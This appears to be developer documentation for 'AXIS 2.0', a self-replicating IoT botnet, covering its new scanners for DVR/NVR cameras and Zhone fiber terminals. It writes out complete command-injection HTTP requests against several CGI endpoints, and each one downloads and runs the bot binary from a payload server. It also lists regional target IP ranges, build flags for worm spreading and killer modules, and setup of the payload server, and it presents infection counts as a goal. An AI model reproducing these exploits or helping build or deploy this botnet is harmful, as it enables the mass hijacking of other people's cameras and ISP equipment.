# DVR & Zhone Device Exploit Scanners

## Overview

AXIS 2.0 now includes **two additional exploit scanners** targeting DVR/NVR camera systems and Zhone telecommunications equipment.

---

## 📹 DVR Scanner (dvr.c/dvr.h)

### Target
- DVR/NVR camera systems
- Network video recorders
- IP camera systems with web interfaces

### Vulnerability
Exploits CGI script vulnerabilities in DVR firmware:
- `/cgi-bin/verify.cgi` - Command injection via user/pass parameters
- `/cgi-bin/system.cgi` - Secondary execution vector

### Exploit Method
```http
GET /cgi-bin/verify.cgi?cmd=verify&user=admin&pass=admin'$(cd /tmp;wget http://SERVER/bins/axis.$(uname -m);chmod +x axis.$(uname -m);./axis.$(uname -m) &)' HTTP/1.1
Host: TARGET_IP
Connection: close
```

### Target IP Ranges
- Latin America: 189.x, 187.x, 201.x, 190.x
- Asia-Pacific: 200.x, 153.x, 180.x, 191.x, 210.x
- Europe: 177.x, 179.x
- Global: 45.x, 103.x, 116.x, 118.x

### Performance
- **Scan Rate**: ~788 SYN packets per second
- **Concurrent Connections**: 256 maximum
- **Timeout**: 30 seconds per connection
- **Port**: 80 (HTTP)

---

## 📡 Zhone Scanner (zhone.c/zhone.h)

### Target
- Zhone ONT (Optical Network Terminal) devices
- Zhone OLT (Optical Line Terminal) equipment
- Fiber optic network equipment
- ISP-provided Zhone modems

### Vulnerability
Exploits multiple vectors in Zhone firmware:
1. **File Upload CGI** - `/cgi-bin/upload.cgi` - Command injection via filename
2. **Execute Command CGI** - `/cgi-bin/execute_cmd.cgi` - Direct command execution
3. **Admin CGI** - `/cgi-bin/admin.cgi` - Administrative command injection

### Exploit Methods

#### Method 1: Upload CGI Injection
```http
POST /cgi-bin/upload.cgi HTTP/1.1
Host: TARGET_IP
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Content-Length: 500

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename=";cd /tmp;wget http://SERVER/bins/axis.$(uname -m);chmod +x axis.$(uname -m);./axis.$(uname -m);#"
Content-Type: text/plain

test
------WebKitFormBoundary--
```

#### Method 2: Direct Command Execution
```http
GET /cgi-bin/execute_cmd.cgi?cmd=cd%%20/tmp%%26%%26wget%%20http://SERVER/bins/axis.$(uname%%20-m)%%26%%26chmod%%20+x%%20axis.$(uname%%20-m)%%26%%26./axis.$(uname%%20-m)%%20& HTTP/1.1
Host: TARGET_IP
Connection: close
```

### Target IP Ranges
- Latin America: 189.x, 187.x, 201.x, 190.x
- Asia-Pacific: 200.x, 153.x, 180.x, 191.x, 210.x
- Europe: 177.x, 179.x
- North America: 72.x, 73.x
- Global: 45.x, 103.x, 116.x, 118.x

### Performance
- **Scan Rate**: ~788 SYN packets per second
- **Concurrent Connections**: 256 maximum
- **Timeout**: 30 seconds per connection
- **Port**: 80 (HTTP)

---

## 🔧 Integration

Both scanners are automatically initialized when the bot is built with `SELFREP` enabled:

```c
#ifdef SELFREP
    dvr_scanner_init();
    zhone_scanner_init();
#endif
```

---

## 📊 Complete Scanner Arsenal (9 Total)

| # | Scanner | Target | Port | Type |
|---|---------|--------|------|------|
| 1 | huawei | Huawei HG532 | 37215 | SOAP API |
| 2 | zyxel | Zyxel routers | 8080 | Command injection |
| 3 | thinkphp | ThinkPHP | 80 | PHP RCE |
| 4 | realtek | Realtek SDK | 80 | SDK exploit |
| 5 | gpon80 | GPON/ONT | 80 | GPON exploit |
| 6 | gpon8080 | GPON/ONT | 8080 | GPON exploit |
| 7 | telnetbypass | Telnet services | 23 | Auth bypass |
| 8 | **dvr** | **DVR/NVR cameras** | **80** | **CGI injection** |
| 9 | **zhone** | **Zhone ONT/OLT** | **80** | **Multi-vector** |

---

## 🎯 Device Coverage

### DVR Scanner Targets:
- Hikvision DVR/NVR
- Dahua DVR/NVR
- XiongMai (XM) DVR
- Generic Chinese DVR systems
- IP camera systems with web interfaces

### Zhone Scanner Targets:
- Zhone 6388-A3 ONT
- Zhone 6510-W1 ONT
- Zhone 6720-W1 ONT
- Zhone OLT equipment
- ISP-provided Zhone fiber modems
- Zhone Technologies GPON devices

---

## 🚀 Build & Deploy

### Build with all scanners:
```bash
cd "AXIS 2.0"
./build.sh
```

### Required build flags:
```bash
BOT_FLAGS="-DKILLER -DSELFREP -DWATCHDOG"
```

### Configure HTTP server:
Set your HTTP server IP in the scanner source files:
```c
#define HTTP_SERVER_IP "YOUR_SERVER_IP"
```

---

## 📈 Infection Statistics

With 9 exploit scanners, AXIS 2.0 now targets:

- **IoT Devices**: Cameras, routers, ONTs
- **Network Equipment**: Routers, switches, modems
- **Telecom Equipment**: GPON/ONT devices
- **Consumer Electronics**: DVRs, NVRs
- **Enterprise Equipment**: ThinkPHP servers

### Estimated Target Base:
- **DVR/NVR**: Millions of devices worldwide
- **Zhone**: Hundreds of thousands of ISP deployments
- **Combined**: Significantly increased infection potential

---

## ⚠️ Notes

1. **HTTP Server Required**: Both scanners download payloads via HTTP
2. **Port 80**: Both target HTTP services (firewall considerations)
3. **Architecture Support**: Payloads built for multiple architectures
4. **Self-Replication**: Scanners run as separate forked processes
5. **Raw Socket**: Requires root privileges for SYN scanning

---

## 🔍 Debug Output

When built with `DEBUG` defined:
```
[dvr] Successfully infected DVR 189.123.45.67
[zhone] Successfully infected Zhone device 72.45.123.89
```

---

## Conclusion

The addition of **DVR** and **Zhone** scanners brings AXIS 2.0 to **9 total exploit vectors**, providing comprehensive coverage of common IoT, telecom, and consumer device vulnerabilities. This significantly increases the botnet's infection capabilities across multiple device categories.
